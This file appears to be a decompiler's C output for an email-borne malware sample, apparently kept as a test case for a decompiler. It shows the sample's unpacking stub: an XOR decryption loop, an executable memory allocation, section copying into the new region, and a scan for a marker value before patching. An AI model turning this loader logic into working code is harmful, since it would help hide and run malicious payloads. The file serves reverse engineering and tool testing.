// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0012/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401010(byte al, Eq_5 * fs, word32 dwArg00)
{
	fn0040115C(fp - 0x00000004, fs, dwLoc24, dwLoc20, dwLoc1C);
	word32 eax_32 = (dwLoc20 << 0x00000008) + 0x003FA900;
	word32 dwLoc24_38 = Mem0[eax_32 + 0x000020CB - dwLoc20:word32];
	Eq_27 eax_42 = eax_32 + 0x000020DF - dwLoc20;
	VirtualProtect(eax_42, dwLoc24_38, 0x00000004, fp - 0x00000008);
	Eq_22 ecx_55 = dwLoc24_38;
	Eq_27 ebx_56 = eax_42;
	word32 eax_58 = dwLoc20.u0;
	int32 dwLoc08_61 = 0x00000001;
	Mem70[ebx_56 + 0x00000000:word32] = Mem0[ebx_56 + 0x00000000:word32] ^ eax_58;
	ecx_55 = ecx_55 - 0xFFFFFFAD - dwLoc20;
	while (ecx_55 >= 0x00000000)
	{
		eax_58 = eax_58 + 0x0FB750A4 + dwLoc08_61;
		ebx_56 = ebx_56 + 0x0000005B - dwLoc20;
		dwLoc08_61 = -fp->dwFFFFFFF8;
		Mem70[ebx_56 + 0x00000000:word32] = Mem0[ebx_56 + 0x00000000:word32] ^ eax_58;
		ecx_55 = ecx_55 - 0xFFFFFFAD - dwLoc20;
	}
	word32 ebx_90 = Mem70[eax_42 + 0x00000093 - dwLoc20:word32] + eax_42;
	word32 dwLoc1C_117 = (word32) ebx_90->b0006;
	fp->dwFFFFFFF8 = 0x00003000;
	Eq_63 * eax_105 = VirtualAlloc(ebx_90->t0034, ebx_90->t0050, 0x00000004, 0x00000040);
	Mem111[fp - 0x00000028:word32] = eax_42;
	fn0040113F(ebx_90->dw0054, 0x00000004, eax_105);
	Eq_92 * esi_115 = &ebx_90->t00F8;
	do
	{
		fn0040113F(esi_115->dw0010, eax_42 + Mem111[esi_115 + 0x00000014:word32], eax_105 + Mem111[esi_115 + 0x0000000C:word32]);
		word32 v17_133 = dwLoc1C_117 - 0x00000001;
		esi_115 = esi_115 + 1;
		dwLoc1C_117 = v17_133;
	} while (v17_133 != 0x00000000);
	Eq_63 * eax_143 = eax_105;
	do
		eax_143 = eax_143 + 1;
	while (eax_143->dw0000 != 0xAABBCCDD);
	fn0040113F(0x00000038, 0x00401174, eax_143);
	return;
}

void fn0040113F(word32 dwArg04, ptr32 dwArg08, Eq_63 * dwArg0C)
{
	Eq_149 * esi_13 = dwArg08;
	Eq_151 * edi_15 = dwArg0C;
	word32 ecx_17 = dwArg04;
	do
	{
		edi_15->b0000 = esi_13->b0000;
		esi_13 = esi_13 + 1;
		edi_15 = edi_15 + 1;
		ecx_17 = ecx_17 - 0x00000001;
	} while (ecx_17 != 0x00000000);
	return;
}

void fn0040115C(Eq_4 * ebp, Eq_5 * fs, Eq_6 tArg00, Eq_7 tArg04, Eq_8 tArg08)
{
	CreateJobSet(tArg00, tArg04, tArg08);
	ebp->dwFFFFFFE4 = fs->ptr0018->dw0034;
	return;
}

